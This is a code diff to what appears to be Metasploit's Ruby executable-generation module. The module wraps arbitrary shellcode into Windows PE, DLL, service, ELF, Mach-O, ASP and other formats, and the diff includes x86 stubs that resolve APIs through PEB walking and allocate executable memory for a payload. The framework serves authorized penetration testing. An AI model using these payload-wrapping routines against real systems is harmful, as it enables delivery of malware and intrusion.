@@ -137,7 +137,6 @@ require 'digest/sha1'
 		nil
 	end
 
-
 	def self.to_win32pe(framework, code, opts={})
 
 		# For backward compatability, this is roughly equivalent to 'exe-small' fmt
@@ -366,8 +365,11 @@ require 'digest/sha1'
 
 	def self.to_winpe_only(framework, code, opts={}, arch="x86")
 
-		# Allow the user to specify their own EXE template
+		if arch == ARCH_X86_64
+			arch = ARCH_X64
+		end
 
+		# Allow the user to specify their own EXE template
 		set_template_default(opts, "template_"+arch+"_windows.exe")
 
 		pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
@@ -400,7 +402,6 @@ require 'digest/sha1'
 		return exe
 	end
 
-
 	def self.to_win32pe_old(framework, code, opts={})
 
 		payload = code.dup
@@ -412,11 +413,9 @@ require 'digest/sha1'
 			pe = fd.read(fd.stat.size)
 		}
 
-		if(payload.length < 2048)
+		if(payload.length <= 2048)
 			payload << Rex::Text.rand_text(2048-payload.length)
-		end
-
-		if(payload.length > 2048)
+		else
 			raise RuntimeError, "The EXE generator now has a max size of 2048 bytes, please fix the calling module"
 		end
 
@@ -461,11 +460,15 @@ require 'digest/sha1'
 
 		bo = pe.index('PAYLOAD:')
 		raise RuntimeError, "Invalid Win32 PE EXE subst template: missing \"PAYLOAD:\" tag" if not bo
-		pe[bo, 8192] = [code].pack("a8192")
+
+		if (code.length <= 4096)
+			pe[bo, code.length] = [code].pack("a*")
+		else
+			raise RuntimeError, "The EXE generator now has a max size of 4096 bytes, please fix the calling module"
+		end
 
 		return pe
 	end
-
 
 	def self.to_win64pe(framework, code, opts={})
 
@@ -479,7 +482,12 @@ require 'digest/sha1'
 
 		bo = pe.index('PAYLOAD:')
 		raise RuntimeError, "Invalid Win64 PE EXE template: missing \"PAYLOAD:\" tag" if not bo
-		pe[bo, code.length] = code
+
+		if (code.length <= 4096)
+			pe[bo, code.length] = [code].pack("a*")
+		else
+			raise RuntimeError, "The EXE generator now has a max size of 4096 bytes, please fix the calling module"
+		end
 
 		return pe
 	end
@@ -498,7 +506,12 @@ require 'digest/sha1'
 
 		bo = pe.index('PAYLOAD:')
 		raise RuntimeError, "Invalid Win32 PE Service EXE template: missing \"PAYLOAD:\" tag" if not bo
-		pe[bo, 8192] = [code].pack("a8192")
+
+		if (code.length <= 8192)
+			pe[bo, code.length] = [code].pack("a*")
+		else
+			raise RuntimeError, "The EXE generator now has a max size of 8192 bytes, please fix the calling module"
+		end
 
 		if name
 			bo = pe.index('SERVICENAME')
@@ -527,7 +540,12 @@ require 'digest/sha1'
 
 		bo = pe.index('PAYLOAD:')
 		raise RuntimeError, "Invalid Win64 PE Service EXE template: missing \"PAYLOAD:\" tag" if not bo
-		pe[bo, 8192] = [code].pack("a8192")
+
+		if (code.length <= 8192)
+			pe[bo, code.length] = [code].pack("a*")
+		else
+			raise RuntimeError, "The EXE generator now has a max size of 8192 bytes, please fix the calling module"
+		end
 
 		if name
 			bo = pe.index('SERVICENAME')
@@ -554,7 +572,12 @@ require 'digest/sha1'
 
 		bo = pe.index('PAYLOAD:')
 		raise RuntimeError, "Invalid Win32 PE DLL template: missing \"PAYLOAD:\" tag" if not bo
-		pe[bo, 8192] = [code].pack("a8192")
+
+		if (code.length <= 2048)
+			pe[bo, code.length] = [code].pack("a*")
+		else
+			raise RuntimeError, "The EXE generator now has a max size of 2048 bytes, please fix the calling module"
+		end
 
 		# optional mutex
 		mt = pe.index('MUTEX!!!')
@@ -575,7 +598,12 @@ require 'digest/sha1'
 
 		bo = pe.index('PAYLOAD:')
 		raise RuntimeError, "Invalid Win64 PE DLL template: missing \"PAYLOAD:\" tag" if not bo
-		pe[bo, 8192] = [code].pack("a8192")
+
+		if (code.length <= 2048)
+			pe[bo, code.length] = [code].pack("a*")
+		else
+			raise RuntimeError, "The EXE generator now has a max size of 2048 bytes, please fix the calling module"
+		end
 
 		# optional mutex
 		mt = pe.index('MUTEX!!!')
@@ -1427,7 +1455,6 @@ End Sub
 		return self.to_war(jspraw, opts)
 	end
 
-
 	# Creates a .NET DLL which loads data into memory
 	# at a specified location with read/execute permissions
 	#    - the data will be loaded at: base+0x2065
@@ -1513,11 +1540,10 @@ End Sub
 		api_call:
 		  pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
 		  mov ebp, esp           ; Create a new stack frame
-		  xor eax, eax           ; Zero EDX
-		  mov eax, [fs:eax+48]   ; Get a pointer to the PEB
-		  mov eax, [eax+12]      ; Get PEB->Ldr
-		  mov eax, [eax+20]      ; Get the first module from the InMemoryOrder module list
-		  mov edx, eax
+		  xor edx, edx           ; Zero EDX
+		  mov edx, [fs:edx+48]   ; Get a pointer to the PEB
+		  mov edx, [edx+12]      ; Get PEB->Ldr
+		  mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
 		next_mod:                ;
 		  mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
 		  movzx ecx, word [edx+38] ; Set ECX to the length we want to check
@@ -1531,8 +1557,13 @@ End Sub
 		not_lowercase:           ;
 		  ror edi, 13            ; Rotate right our hash value
 		  add edi, eax           ; Add the next byte of the name
+		  ;loop loop_modname      ; Loop until we have read enough
+		  ; The random jmps added below will occasionally make this offset
+		  ; greater than will fit in a byte, so we have to use a regular jnz
+		  ; instruction which can take a full 32-bits to accomodate the
+		  ; bigger offset
 		  dec ecx
-		  jnz loop_modname      ; Loop untill we have read enough
+		  jnz loop_modname        ; Loop until we have read enough
 		  ; We now have the module hash computed
 		  push edx               ; Save the current position in the module list for later
 		  push edi               ; Save the current module hash for later
@@ -1550,7 +1581,7 @@ End Sub
 		  add ebx, edx           ; Add the modules base address
 		  ; Computing the module hash + function hash
 		get_next_func:           ;
-		  test ecx, ecx          ; (Changed from JECXZ to work around METASM)
+		  test ecx, ecx          ; Changed from jecxz to accomodate the larger offset produced by random jmps below
 		  jz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
 		  dec ecx                ; Decrement the function name counter
 		  mov esi, [ebx+ecx*4]   ; Get rva of next module name
@@ -1593,7 +1624,7 @@ End Sub
 		  pop edi                ; Pop off the current (now the previous) modules hash
 		  pop edx                ; Restore our position in the module list
 		  mov edx, [edx]         ; Get the next module
-		  jmp next_mod     ; Process this module
+		  jmp next_mod           ; Process this module
 		^
 
 		stub_exit = %Q^
@@ -1626,7 +1657,7 @@ End Sub
 		  pop ebp                ; Pop off the address of 'api_call' for calling later.
 
 		allocate_size:
-		   mov esi,PAYLOAD_SIZE
+		   mov esi, #{code.length}
 
 		allocate:
 		  push byte 0x40         ; PAGE_EXECUTE_READWRITE
@@ -1659,9 +1690,8 @@ End Sub
 		get_payload:
 		  call got_payload
 		payload:
-		; Append an arbitary payload here
+		; Append an arbitrary payload here
 		^
-
 
 		stub_alloc.gsub!('short', '')
 		stub_alloc.gsub!('byte', '')
@@ -1693,10 +1723,8 @@ End Sub
 		wrapper << stub_final
 
 		enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
-		off = enc.offset_of_reloc('PAYLOAD_SIZE')
 		res = enc.data + code
 
-		res[off,4] = [code.length].pack('V')
 		res
 	end
 
@@ -1735,12 +1763,11 @@ End Sub
 		not_lowercase:           ;
 		  ror edi, 13            ; Rotate right our hash value
 		  add edi, eax           ; Add the next byte of the name
-		  dec ecx
-		  jnz loop_modname      ; Loop untill we have read enough
+		  loop loop_modname      ; Loop until we have read enough
 		  ; We now have the module hash computed
 		  push edx               ; Save the current position in the module list for later
 		  push edi               ; Save the current module hash for later
-		  ; Proceed to itterate the export address table,
+		  ; Proceed to iterate the export address table,
 		  mov edx, [edx+16]      ; Get this modules base address
 		  mov eax, [edx+60]      ; Get PE header
 		  add eax, edx           ; Add the modules base address
@@ -1796,7 +1823,7 @@ End Sub
 		  pop edi                ; Pop off the current (now the previous) modules hash
 		  pop edx                ; Restore our position in the module list
 		  mov edx, [edx]         ; Get the next module
-		  jmp next_mod     ; Process this module
+		  jmp next_mod           ; Process this module
 		^
 
 		stub_exit = %Q^
@@ -1830,7 +1857,7 @@ End Sub
 		  pop ebp                ; Pop off the address of 'api_call' for calling later.
 
 		allocate_size:
-		   mov esi,PAYLOAD_SIZE
+		   mov esi,#{code.length}
 
 		allocate:
 		  push byte 0x40         ; PAGE_EXECUTE_READWRITE
@@ -1876,7 +1903,7 @@ End Sub
 		get_payload:
 		  call got_payload
 		payload:
-		; Append an arbitary payload here
+		; Append an arbitrary payload here
 		^
 
 
@@ -1918,11 +1945,9 @@ End Sub
 		wrapper << stub_final
 
 		enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
-		off = enc.offset_of_reloc('PAYLOAD_SIZE')
 		soff = enc.data.index("\xe9\xff\xff\xff\xff") + 1
 		res = enc.data + code
 
-		res[off,4] = [code.length].pack('V')
 		if which_offset == 'start'
 			res[soff,4] = [block_offset - (soff + 4)].pack('V')
 		elsif which_offset == 'end'
@@ -1935,72 +1960,104 @@ End Sub
 
 
 	#
-	# This routine is shared between msfencode, rpc, and payload modules (use <payload>)
+	# Generate an executable of a given format suitable for running on the
+	# architecture/platform pair.
 	#
-	# It will return nil if it wasn't able to generate any output.
+	# This routine is shared between msfencode, rpc, and payload modules (use
+	# <payload>)
 	#
+	# @param framework [Framework]
+	# @param arch [String] Architecture for the target format; one of the ARCH_*
+	# constants
+	# @param plat [#index] platform
+	# @param code [String] The shellcode for the resulting executable to run
+	# @param fmt [String] One of the executable formats as defined in
+	#   {.to_executable_fmt_formats}
+	# @param exeopts [Hash] Passed directly to the approrpriate method for
+	#   generating an executable for the given +arch+/+plat+ pair.
+	# @return [String] An executable appropriate for the given
+	#   architecture/platform pair.
+	# @return [nil] If the format is unrecognized or the arch and plat don't
+	#   make sense together.
 	def self.to_executable_fmt(framework, arch, plat, code, fmt, exeopts)
-
-		output = nil
+		# For backwards compatibility with the way this gets called when
+		# generating from Msf::Simple::Payload.generate_simple
+		if arch.kind_of? Array
+			output = nil
+			arch.each do |a|
+				output = to_executable_fmt(framework, a, plat, code, fmt, exeopts)
+				break if output
+			end
+			return output
+		end
 
 		case fmt
+		when 'asp'
+			output = Msf::Util::EXE.to_win32pe_asp(framework, code, exeopts)
+
+		when 'aspx'
+			output = Msf::Util::EXE.to_win32pe_aspx(framework, code, exeopts)
+
 		when 'dll'
-			if (not arch or (arch.index(ARCH_X86)))
-				output = Msf::Util::EXE.to_win32pe_dll(framework, code, exeopts)
-			end
-
-			if(arch and (arch.index( ARCH_X86_64 ) or arch.index( ARCH_X64 )))
-				output = Msf::Util::EXE.to_win64pe_dll(framework, code, exeopts)
-			end
-
+			output = case arch
+				when ARCH_X86,nil then to_win32pe_dll(framework, code, exeopts)
+				when ARCH_X86_64  then to_win64pe_dll(framework, code, exeopts)
+				when ARCH_X64     then to_win64pe_dll(framework, code, exeopts)
+				end
 		when 'exe'
-			if (not arch or (arch.index(ARCH_X86)))
-				output = Msf::Util::EXE.to_win32pe(framework, code, exeopts)
-			end
+			output = case arch
+				when ARCH_X86,nil then to_win32pe(framework, code, exeopts)
+				when ARCH_X86_64  then to_win64pe(framework, code, exeopts)
+				when ARCH_X64     then to_win64pe(framework, code, exeopts)
+				end
 
-			if(arch and (arch.index( ARCH_X86_64 ) or arch.index( ARCH_X64 )))
-				output = Msf::Util::EXE.to_win64pe(framework, code, exeopts)
+		when 'exe-service'
+			output = case arch
+				when ARCH_X86,nil then to_win32pe_service(framework, code, exeopts)
+				when ARCH_X86_64  then to_win64pe_service(framework, code, exeopts)
+				when ARCH_X64     then to_win64pe_service(framework, code, exeopts)
 			end
 
 		when 'exe-small'
-			if(not arch or (arch.index(ARCH_X86)))
-				output = Msf::Util::EXE.to_win32pe_old(framework, code, exeopts)
-			end
+			output = case arch
+				when ARCH_X86,nil then to_win32pe_old(framework, code, exeopts)
+				end
 
 		when 'exe-only'
-			if(not arch or (arch.index(ARCH_X86)))
-				output = Msf::Util::EXE.to_winpe_only(framework, code, exeopts)
-			end
-
-			if(arch and (arch.index( ARCH_X86_64 ) or arch.index( ARCH_X64 )))
-				output = Msf::Util::EXE.to_winpe_only(framework, code, exeopts, "x64")
-			end
+			output = case arch
+				when ARCH_X86,nil then to_winpe_only(framework, code, exeopts, arch)
+				when ARCH_X86_64  then to_winpe_only(framework, code, exeopts, arch)
+				when ARCH_X64     then to_winpe_only(framework, code, exeopts, arch)
+				end
 
 		when 'elf'
 			if (not plat or (plat.index(Msf::Module::Platform::Linux)))
-				if (not arch or (arch.index(ARCH_X86)))
-					output = Msf::Util::EXE.to_linux_x86_elf(framework, code, exeopts)
-				elsif (arch and (arch.index( ARCH_X86_64 ) or arch.index( ARCH_X64 )))
-					output = Msf::Util::EXE.to_linux_x64_elf(framework, code, exeopts)
-				end
+				output = case arch
+					when ARCH_X86,nil then to_linux_x86_elf(framework, code, exeopts)
+					when ARCH_X86_64  then to_linux_x64_elf(framework, code, exeopts)
+					when ARCH_X64     then to_linux_x64_elf(framework, code, exeopts)
+					when ARCH_ARMLE   then to_linux_armle_elf(framework, code, exeopts)
+					when ARCH_MIPSBE  then to_linux_mipsbe_elf(framework, code, exeopts)
+					when ARCH_MIPSLE  then to_linux_mipsle_elf(framework, code, exeopts)
+					end
 			elsif(plat and (plat.index(Msf::Module::Platform::BSD)))
-				if (not arch or (arch.index(ARCH_X86)))
-					output = Msf::Util::EXE.to_bsd_x86_elf(framework, code, exeopts)
-				end
+				output = case arch
+					when ARCH_X86,nil then Msf::Util::EXE.to_bsd_x86_elf(framework, code, exeopts)
+					end
 			elsif(plat and (plat.index(Msf::Module::Platform::Solaris)))
-				if (not arch or (arch.index(ARCH_X86)))
-					output = Msf::Util::EXE.to_solaris_x86_elf(framework, code, exeopts)
-				end
+				output = case arch
+					when ARCH_X86,nil then to_solaris_x86_elf(framework, code, exeopts)
+					end
 			end
 
 		when 'macho'
-			if (not arch or (arch.index(ARCH_X86)))
-				output = Msf::Util::EXE.to_osx_x86_macho(framework, code, exeopts)
-			end
-
-			if (arch and (arch.index(ARCH_X86_64) or arch.index(ARCH_X64)))
-				output = Msf::Util::EXE.to_osx_x64_macho(framework, code, exeopts)
-			end
+			output = case arch
+				when ARCH_X86,nil then to_osx_x86_macho(framework, code, exeopts)
+				when ARCH_X86_64  then to_osx_x64_macho(framework, code, exeopts)
+				when ARCH_X64     then to_osx_x64_macho(framework, code, exeopts)
+				when ARCH_ARMLE   then to_osx_arm_macho(framework, code, exeopts)
+				when ARCH_PPC     then to_osx_ppc_macho(framework, code, exeopts)
+				end
 
 		when 'vba'
 			output = Msf::Util::EXE.to_vba(framework, code, exeopts)
@@ -2014,12 +2071,6 @@ End Sub
 
 		when 'loop-vbs'
 			output = Msf::Util::EXE.to_win32pe_vbs(framework, code, exeopts.merge({ :persist => true }))
-
-		when 'asp'
-			output = Msf::Util::EXE.to_win32pe_asp(framework, code, exeopts)
-
-		when 'aspx'
-			output = Msf::Util::EXE.to_win32pe_aspx(framework, code, exeopts)
 
 		when 'war'
 			arch ||= [ ARCH_X86 ]
@@ -2040,7 +2091,10 @@ End Sub
 	end
 
 	def self.to_executable_fmt_formats
-		['dll','exe','exe-small','exe-only','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war','psh','psh-net']
+		[
+			'dll','exe','exe-service','exe-small','exe-only','elf','macho','vba','vba-exe',
+			'vbs','loop-vbs','asp','aspx','war','psh','psh-net'
+		]
 	end
 
 	#
